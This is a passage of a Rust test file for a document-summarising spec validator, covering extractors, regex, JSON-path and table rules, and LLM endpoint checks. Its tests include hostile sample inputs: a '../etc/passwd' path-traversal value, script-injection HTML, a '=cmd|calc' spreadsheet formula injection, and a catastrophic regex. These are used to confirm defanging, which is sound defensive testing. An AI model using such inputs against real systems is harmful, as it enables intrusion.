        s.artifact_title = Some("../etc/passwd".into());
        assert!(s.validate(&[]).is_err());
        let mut s = spec();
        s.sample = Some(SampleSpec {
            filename: "a.exe".into(),
            text: "x".into(),
        });
        assert!(s.validate(&[]).is_err());
        s.sample = Some(SampleSpec {
            filename: "a.txt".into(),
            text: "x".into(),
        });
        assert!(s.validate(&[]).is_ok());
    }

    #[test]
    fn rules_render_and_defang_hostile_input() {
        let text =
            "Invoice 42\nTotal: $120\n<script>alert(1)</script> total due\nAmount due: $120\n\
                    retry 3 failed\nretry 7 failed\n";
        let out = spec().render("inv.txt", text).unwrap();
        let body = &out[0].body;
        assert!(body.contains("## Totals") && body.contains("Total: $120"));
        assert!(!body.contains('<') && !body.contains("<script>"));
        assert!(body.contains("2× retry # failed"));
        assert!(body.contains("| Lines | 6 |"));
        assert_eq!(out[0].title, "summary.md");
    }

    #[test]
    fn csv_columns_counts_distinct_and_top_values() {
        let mut s = spec();
        s.accepts = vec!["csv".into()];
        s.summary = vec![Rule::CsvColumns {
            title: "Regions".into(),
            columns: vec!["Region".into(), "missing".into()],
            top: Some(2),
        }];
        let out = s
            .render("d.csv", "id,region\n1,EU\n2,EU\n3,US\n4,\n")
            .unwrap();
        let body = &out[0].body;
        assert!(body.contains("`Region`: 2 distinct. Most common: EU (2), US (1)"));
        assert!(body.contains("`missing`: column not found"));
        assert!(s.render("d.csv", "").is_err());
    }

    #[test]
    fn output_is_capped() {
        let mut s = spec();
        s.summary = vec![
            Rule::KeywordSections {
                title: "T".into(),
                keywords: vec!["x".into()],
                max_lines: Some(20),
            };
            MAX_RULES
        ];
        let line = format!("x {}\n", "y".repeat(200));
        let out = s.render("f.txt", &line.repeat(100)).unwrap();
        assert!(out[0].body.len() <= MAX_OUTPUT_BYTES + 64);
    }

    fn spec_with(extract: &str, accepts: &[&str], rule: serde_json::Value) -> CustomDemoSpec {
        serde_json::from_value(serde_json::json!({
            "id": "t", "title": "T", "accepts": accepts, "extract": extract, "summary": [rule]
        }))
        .unwrap()
    }

    #[test]
    fn new_extractors_accept_only_their_own_file_types() {
        let stats = serde_json::json!({"kind": "stats"});
        for (extract, ok, bad) in [
            ("html", "html", "txt"),
            ("eml", "mbox", "csv"),
            ("docx", "docx", "doc"),
            ("xlsx", "xlsx", "csv"),
            ("pptx", "pptx", "ppt"),
        ] {
            assert!(
                spec_with(extract, &[ok], stats.clone())
                    .validate(&[])
                    .is_ok(),
                "{extract}"
            );
            let err = spec_with(extract, &[bad], stats.clone())
                .validate(&[])
                .unwrap_err();
            assert!(err.contains(&format!(".{bad}")), "{extract}: {err}");
        }
        // The plain text extractor must not be pointed at a binary format.
        for bin in ["docx", "xlsx", "pptx", "zip"] {
            assert!(
                spec_with("text", &[bin], stats.clone())
                    .validate(&[])
                    .is_err(),
                "{bin}"
            );
        }
    }

    #[test]
    fn the_ocr_extractor_reads_images_only_and_never_carries_a_sample() {
        assert_eq!(Extractor::Ocr.guest_file(), "input.img");
        assert!(Extractor::Ocr.script().is_none());
        let ok = spec_with(
            "ocr",
            &["png", "jpg", "jpeg", "tif", "tiff"],
            serde_json::json!({"kind": "stats"}),
        );
        assert_eq!(ok.validate(&[]), Ok(()));
        // Not an image: refused at deploy time, with the extractor named.
        let pdf = spec_with("ocr", &["pdf"], serde_json::json!({"kind": "stats"}));
        assert!(pdf
            .validate(&[])
            .unwrap_err()
            .contains("ocr extractor reads only"));
        // The text extractor must not be pointed at a photo either.
        let text_png = spec_with("text", &["jpeg"], serde_json::json!({"kind": "stats"}));
        assert!(text_png
            .validate(&[])
            .unwrap_err()
            .contains("use the extractor made for it"));
        // A bundled sample is text, so an image extractor cannot carry one.
        let mut with_sample = ok.clone();
        with_sample.sample = Some(SampleSpec {
            filename: "a.png".into(),
            text: "x".into(),
        });
        assert!(with_sample.validate(&[]).is_err());
    }

    #[test]
    fn script_extractors_have_fixed_guest_files_and_scripts() {
        assert_eq!(Extractor::Docx.guest_file(), "input.docx");
        assert_eq!(Extractor::Pptx.guest_file(), "input.pptx");
        assert_eq!(Extractor::Eml.guest_file(), "input.eml");
        for e in [
            Extractor::Html,
            Extractor::Eml,
            Extractor::Docx,
            Extractor::Xlsx,
            Extractor::Pptx,
        ] {
            assert!(e.script().unwrap().contains("process.argv[2]"));
        }
        assert!(Extractor::Pdftotext.script().is_none() && Extractor::Text.script().is_none());
        // Binary formats cannot carry a text sample.
        let mut s = spec_with("docx", &["docx"], serde_json::json!({"kind": "stats"}));
        s.sample = Some(SampleSpec {
            filename: "a.docx".into(),
            text: "x".into(),
        });
        assert!(s.validate(&[]).unwrap_err().contains("sample"));
    }

    fn render(rule: serde_json::Value, text: &str) -> Result<String, String> {
        let s = spec_with("text", &["txt"], rule);
        s.validate(&[])?;
        Ok(s.render("f.txt", text)?.remove(0).body)
    }

    #[test]
    fn regex_extract_counts_values_and_honours_the_group() {
        let text = "Invoice INV-001 total 5\nInvoice INV-002\nagain INV-001\n";
        let out = render(
            serde_json::json!({"kind": "regex_extract", "title": "Ids", "pattern": "INV-(\\d+)", "group": 1}),
            text,
        )
        .unwrap();
        assert!(out.contains("- 2× 001"), "{out}");
        assert!(out.contains("- 1× 002"), "{out}");
        let none = render(
            serde_json::json!({"kind": "regex_extract", "title": "X", "pattern": "zzz"}),
            text,
        )
        .unwrap();
        assert!(none.contains("(no matches)"));
    }

    #[test]
    fn regex_patterns_are_bounded_and_cannot_backtrack() {
        for (pattern, why) in [
            ("(a", "unbalanced"),
            ("(a)\\1", "backreference"),
            ("(?=x)", "lookahead"),
            (&"a".repeat(201), "too long"),
            ("", "empty"),
        ] {
            let err = render(
                serde_json::json!({"kind": "regex_extract", "title": "X", "pattern": pattern}),
                "a",
            )
            .unwrap_err();
            assert!(err.contains("pattern"), "{why}: {err}");
        }
        // A classic catastrophic pattern is fine here: matching is linear.
        let t = std::time::Instant::now();
        render(
            serde_json::json!({"kind": "regex_extract", "title": "X", "pattern": "(a+)+$"}),
            &format!("{}b", "a".repeat(50_000)),
        )
        .unwrap();
        assert!(t.elapsed() < std::time::Duration::from_secs(5));
        // A group that the pattern does not have is refused at deploy time.
        assert!(render(
            serde_json::json!({"kind": "regex_extract", "title": "X", "pattern": "a", "group": 2}),
            "a"
        )
        .is_err());
    }

    #[test]
    fn json_path_reads_keys_indexes_and_wildcards() {
        let doc = r#"{"vendor":{"name":"Acme"},"items":[{"id":1,"sku":"a"},{"id":2,"sku":"b"}]}"#;
        let out = render(
            serde_json::json!({"kind": "json_path", "title": "Facts",
                "paths": ["vendor.name", "items[*].sku", "$.items[1].id", "missing.x"]}),
            doc,
        )
        .unwrap();
        assert!(out.contains("`vendor.name`: Acme"), "{out}");
        assert!(out.contains("`items[*].sku`: a; b"), "{out}");
        assert!(out.contains("`$.items[1].id`: 2"), "{out}");
        assert!(out.contains("`missing.x`: (not found)"), "{out}");
    }

    #[test]
    fn json_path_rejects_bad_paths_and_bad_json() {
        for p in ["", "a[", "a[x]", "a..b", "a[0]b"] {
            assert!(
                render(
                    serde_json::json!({"kind": "json_path", "title": "X", "paths": [p]}),
                    "{}"
                )
                .is_err(),
                "{p:?}"
            );
        }
        let err = render(
            serde_json::json!({"kind": "json_path", "title": "X", "paths": ["a"]}),
            "not json",
        )
        .unwrap_err();
        assert!(err.contains("not valid JSON"), "{err}");
    }

    #[test]
    fn table_shows_the_first_rows_and_defangs_cells() {
        let csv = "name,note\nAnn,=cmd|calc\nBob,<b>x</b>\nCy,3\n";
        let out = render(
            serde_json::json!({"kind": "table", "title": "Rows", "max_rows": 2}),
            csv,
        )
        .unwrap();
        assert!(out.contains("| name | note |"), "{out}");
        assert!(out.contains("| Ann | =cmd/calc |"), "{out}");
        assert!(!out.contains('<'), "markup must be defanged: {out}");
        assert!(!out.contains("Cy"), "{out}");
        assert!(out.contains("2 of 3 rows shown"), "{out}");
    }

    /// The guest scripts run on untrusted files. Run them here when Node is present.
    #[test]
    fn the_guest_scripts_extract_text() {
        if std::process::Command::new("node")
            .arg("--version")
            .output()
            .is_err()
        {
            eprintln!("node not installed; skipping guest script test");
            return;
        }
        let dir = std::env::temp_dir().join(format!("zyvor-extract-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let run = |e: Extractor, name: &str, bytes: &[u8]| -> (String, bool) {
            let script = dir.join(format!("{name}.mjs"));
            let input = dir.join(name);
            std::fs::write(&script, e.script().unwrap()).unwrap();
            std::fs::write(&input, bytes).unwrap();
            let out = std::process::Command::new("node")
                .arg(&script)
                .arg(&input)
                .output()
                .unwrap();
            (
                String::from_utf8_lossy(&out.stdout).into_owned(),
                out.status.success(),
            )
        };

        let (html, ok) = run(
            Extractor::Html,
            "a.html",
            b"<h1>Hi &amp; bye</h1><script>alert(1)</script><p>one<br>two</p><<b>script>alert(2)<</b>/script>",
        );
        assert!(
            ok && html.contains("# Hi & bye") && html.contains("one\ntwo"),
            "{html}"
        );
        assert!(
            !html.contains("alert(1)"),
            "scripts must be dropped: {html}"
        );
        assert!(
            !html.contains("<script"),
            "nested tags must not reassemble a tag: {html}"
        );

        let (eml, ok) = run(
            Extractor::Eml,
            "a.mbox",
            b"From a@x Mon\nFrom: A <a@x>\nSubject: Pay =?utf-8?Q?caf=C3=A9?=\n\nSend 50 today\nFrom b@x Tue\nSubject: Two\n\nbody two\n",
        );
        assert!(
            ok && eml.contains("Subject: Pay café") && eml.contains("Send 50 today"),
            "{eml}"
        );
        assert!(
            eml.contains("Subject: Two") && eml.contains("body two"),
            "{eml}"
        );

        let (_, ok) = run(Extractor::Docx, "bad.docx", b"this is not a zip");
        assert!(!ok, "a damaged docx must fail, not print garbage");

        // A small pptx built in place: two slides listed in presentation order (slide2 first),
        // one with speaker notes, and a slide-number field that must not appear.
        let deck = stored_zip(&[
            (
                "ppt/presentation.xml",
                r#"<p:presentation xmlns:r="r"><p:sldIdLst><p:sldId id="256" r:id="rId2"/><p:sldId id="257" r:id="rId1"/></p:sldIdLst></p:presentation>"#,
            ),
            (
                "ppt/_rels/presentation.xml.rels",
                r#"<Relationships><Relationship Id="rId1" Type="x/slide" Target="slides/slide1.xml"/><Relationship Target="slides/slide2.xml" Type="x/slide" Id="rId2"/></Relationships>"#,
            ),
            (
                "ppt/slides/slide1.xml",
                r#"<p:sld><a:p><a:r><a:t>Budget &amp; plan</a:t></a:r></a:p><a:p><a:r><a:t>Spend 50,000</a:t></a:r><a:br/><a:r><a:t>by Friday</a:t></a:r></a:p><a:p><a:fld type="slidenum"><a:t>2</a:t></a:fld></a:p></p:sld>"#,
            ),
            (
                "ppt/slides/_rels/slide1.xml.rels",
                r#"<Relationships><Relationship Id="rId9" Type="x/notesSlide" Target="../notesSlides/notesSlide1.xml"/></Relationships>"#,
            ),
            (
                "ppt/notesSlides/notesSlide1.xml",
                r#"<p:notes><a:p><a:r><a:t>Say the number twice</a:t></a:r></a:p></p:notes>"#,
            ),
            (
                "ppt/slides/slide2.xml",
                r#"<p:sld><a:p><a:r><a:t>Welcome</a:t></a:r></a:p></p:sld>"#,
            ),
        ]);
        let (pptx, ok) = run(Extractor::Pptx, "deck.pptx", &deck);
        assert!(ok, "{pptx}");
        assert!(pptx.starts_with("# Deck: 2 slides"), "{pptx}");
        let welcome = pptx.find("Welcome").expect("slide 1 text");
        let budget = pptx.find("Budget & plan").expect("slide 2 text");
        assert!(
            welcome < budget,
            "presentation order, not file order: {pptx}"
        );
        assert!(pptx.contains("Spend 50,000\nby Friday"), "{pptx}");
        assert!(pptx.contains("Notes: Say the number twice"), "{pptx}");
        assert!(
            !pptx.contains("\n2\n"),
            "the slide-number field must be dropped: {pptx}"
        );
        let (_, ok) = run(Extractor::Pptx, "bad.pptx", b"this is not a zip");
        assert!(!ok, "a damaged pptx must fail, not print garbage");
    }

    /// A zip with stored (uncompressed) entries. The guest reader does not check CRCs.
    fn stored_zip(files: &[(&str, &str)]) -> Vec<u8> {
        let mut out = Vec::new();
        let mut central = Vec::new();
        for (name, data) in files {
            let offset = out.len() as u32;
            let (n, d) = (name.as_bytes(), data.as_bytes());
            out.extend_from_slice(&0x04034b50u32.to_le_bytes());
            out.extend_from_slice(&[20, 0, 0, 0, 0, 0, 0, 0, 0, 0]); // version, flags, method 0, time, date
            out.extend_from_slice(&0u32.to_le_bytes()); // crc
            out.extend_from_slice(&(d.len() as u32).to_le_bytes());
            out.extend_from_slice(&(d.len() as u32).to_le_bytes());
            out.extend_from_slice(&(n.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes());
            out.extend_from_slice(n);
            out.extend_from_slice(d);
            central.extend_from_slice(&0x02014b50u32.to_le_bytes());
            central.extend_from_slice(&[20, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
            central.extend_from_slice(&0u32.to_le_bytes());
            central.extend_from_slice(&(d.len() as u32).to_le_bytes());
            central.extend_from_slice(&(d.len() as u32).to_le_bytes());
            central.extend_from_slice(&(n.len() as u16).to_le_bytes());
            central.extend_from_slice(&[0u8; 8]); // extra len, comment len, disk, internal attrs
            central.extend_from_slice(&0u32.to_le_bytes()); // external attrs
            central.extend_from_slice(&offset.to_le_bytes());
            central.extend_from_slice(n);
        }
        let dir_offset = out.len() as u32;
        out.extend_from_slice(&central);
        out.extend_from_slice(&0x06054b50u32.to_le_bytes());
        out.extend_from_slice(&[0, 0, 0, 0]);
        out.extend_from_slice(&(files.len() as u16).to_le_bytes());
        out.extend_from_slice(&(files.len() as u16).to_le_bytes());
        out.extend_from_slice(&(central.len() as u32).to_le_bytes());
        out.extend_from_slice(&dir_offset.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }
}

#[cfg(test)]
mod model_spec_tests {
    use super::*;

    fn with_model(model: serde_json::Value) -> Result<(), String> {
        let s: CustomDemoSpec = serde_json::from_value(serde_json::json!({
            "id": "m", "title": "M", "accepts": ["txt"], "extract": "text",
            "summary": [{"kind": "stats"}], "model": model
        }))
        .map_err(|e| e.to_string())?;
        s.validate(&[])
    }

    fn ok_model() -> serde_json::Value {
        serde_json::json!({
            "credential": "llm", "base_url": "https://api.example.com/v1",
            "model": "m-1", "instruction": "Summarise."
        })
    }

    #[test]
    fn a_model_step_validates_and_names_its_endpoint() {
        assert!(with_model(ok_model()).is_ok());
        let m: ModelSpec = serde_json::from_value(ok_model()).unwrap();
        assert_eq!(m.host(), "api.example.com");
        assert_eq!(
            m.endpoint().unwrap().as_str(),
            "https://api.example.com/v1/chat/completions"
        );
        assert_eq!(m.input_cap(), 24_000);
        assert_eq!(m.output_cap(), 800);
    }

    #[test]
    fn the_endpoint_must_be_tls_or_loopback_and_carry_nothing_extra() {
        let with = |url: &str| {
            let mut m = ok_model();
            m["base_url"] = url.into();
            with_model(m)
        };
        assert!(with("http://127.0.0.1:8080/v1").is_ok());
        assert!(with("http://localhost:8080/v1").is_ok());
        for bad in [
            "http://api.example.com/v1",
            "http://192.168.1.5/v1",
            "https://user:pw@api.example.com/v1",
            "https://api.example.com/v1?key=abc",
            "https://api.example.com/v1#frag",
            "ftp://api.example.com/v1",
            "not a url",
        ] {
            assert!(with(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn model_fields_are_bounded_and_unknown_fields_rejected() {
        let tweak = |k: &str, v: serde_json::Value| {
            let mut m = ok_model();
            m[k] = v;
            with_model(m)
        };
        assert!(tweak("credential", "".into()).is_err());
        assert!(tweak("credential", "a b".into()).is_err());
        assert!(tweak("model", "".into()).is_err());
        assert!(tweak("instruction", "".into()).is_err());
        assert!(tweak("instruction", "x".repeat(1001).into()).is_err());
        assert!(tweak("max_input_chars", 10.into()).is_err());
        assert!(tweak("max_input_chars", 200_000.into()).is_err());
        assert!(tweak("max_output_tokens", 10.into()).is_err());
        assert!(tweak("max_output_tokens", 9_000.into()).is_err());
        assert!(tweak("max_output_tokens", 500.into()).is_ok());
        assert!(
            tweak("api_key", "sk-live".into()).is_err(),
            "no place to put a key in a pack"
        );
    }
}
